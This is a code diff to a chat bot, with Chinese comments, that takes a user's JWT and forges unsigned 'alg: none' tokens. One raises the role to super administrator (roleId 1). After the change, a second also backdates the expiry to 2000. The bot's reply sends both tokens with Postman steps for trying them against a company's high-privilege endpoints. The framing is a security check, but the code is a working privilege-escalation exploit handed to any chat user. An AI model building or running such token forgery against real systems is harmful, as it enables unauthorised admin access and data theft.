@@ -1591,7 +1591,7 @@ export const startBot = async () => {
       const header = { alg: "none", typ: "JWT" };
       const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
 
-      // 2. 解析原始 Payload 并提权 (roleId: 1)
+      // 2. 解析原始 Payload
       // 处理 Base64Url padding
       let payloadRaw = parts[1].replace(/-/g, '+').replace(/_/g, '/');
       while (payloadRaw.length % 4) payloadRaw += '=';
@@ -1599,22 +1599,33 @@ export const startBot = async () => {
       
       const payloadData = JSON.parse(payloadJson);
       const originalRoleId = payloadData.roleId;
-      payloadData.roleId = "1"; // 提权为超级管理员
+      const originalExp = payloadData.exp;
       
-      const payloadB64 = Buffer.from(JSON.stringify(payloadData)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+      let expDate = "未设置(永久有效)";
+      if (originalExp) {
+        expDate = new Date(originalExp * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+      }
 
-      // 3. 生成无签名的伪造 Token
-      const forgedToken = `${headerB64}.${payloadB64}.`;
+      // PoC 1: 提权为超级管理员
+      const payloadAdmin = { ...payloadData, roleId: "1" };
+      const payloadAdminB64 = Buffer.from(JSON.stringify(payloadAdmin)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+      const forgedAdminToken = `${headerB64}.${payloadAdminB64}.`;
 
-      const replyMsg = `🛡️ **JWT 安全体检 (None 算法漏洞测试)**\n\n` +
-        `🤖 机器人已为你生成用于渗透测试的 **伪造越权 Token (PoC)**。\n` +
-        `⚠️ *基于安全红线准则，已拦截机器人对公司生产接口的自动化攻击发包。*\n\n` +
-        `🔍 **提权信息**: roleId \`${originalRoleId}\` ➡️ \`1\` (超级管理员)\n\n` +
-        `💣 **伪造的攻击 Token (请复制下方代码)**:\n\`\`\`\n${forgedToken}\n\`\`\`\n\n` +
-        `**如何向系统管理员证明？**\n` +
-        `请将此 Token 交给开发人员，让他们在 Postman 中使用此 Token 请求【只有老板才能看】的高权接口。\n` +
-        `如果系统返回 \`200 OK\` 并且吐出了全公司的数据，即**坐实了严重的高危越权漏洞**！\n` +
-        `如果系统报错拦截，说明防御成功。作为奖励，请管理员为本机器人的账号合法开通 roleId: 1 的业务权限！`;
+      // PoC 2: 伪造已过期 (将 exp 设置为 2000年1月1日)
+      const payloadExpired = { ...payloadData, roleId: "1", exp: 946656000 };
+      const payloadExpiredB64 = Buffer.from(JSON.stringify(payloadExpired)).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
+      const forgedExpiredToken = `${headerB64}.${payloadExpiredB64}.`;
+
+      const replyMsg = `🛡️ **JWT 安全体检 (None 算法 & 过期校验漏洞)**\n\n` +
+        `🤖 机器人已为你生成用于渗透测试的 **2个伪造 Token (PoC)**。\n` +
+        `⚠️ *基于安全红线准则，已拦截自动化攻击发包。*\n\n` +
+        `🔍 **基础信息**: 当前角色 \`${originalRoleId}\` | 原过期时间: \`${expDate}\`\n\n` +
+        `💣 **PoC 1: 越权漏洞 Token (roleId: 1)**\n\`\`\`\n${forgedAdminToken}\n\`\`\`\n\n` +
+        `💣 **PoC 2: 过期失效漏洞 Token (exp: 2000年)**\n\`\`\`\n${forgedExpiredToken}\n\`\`\`\n\n` +
+        `**测试指南 (在 Postman 中使用)**\n` +
+        `1. 发送 **PoC 1**：若返回 200 并吐出全量数据，说明 **None算法越权漏洞** 存在！\n` +
+        `2. 发送 **PoC 2**：若仍返回 200，说明系统 **不仅没验签名，连过期时间(exp)都不查**，Token 终生有效，属于严重漏洞连环套！\n` +
+        `若报 401/403，则说明对应防御正常。`;
 
       await bot.sendMessage(msg.chat.id, replyMsg, { parse_mode: 'Markdown' });
     } catch (e: any) {
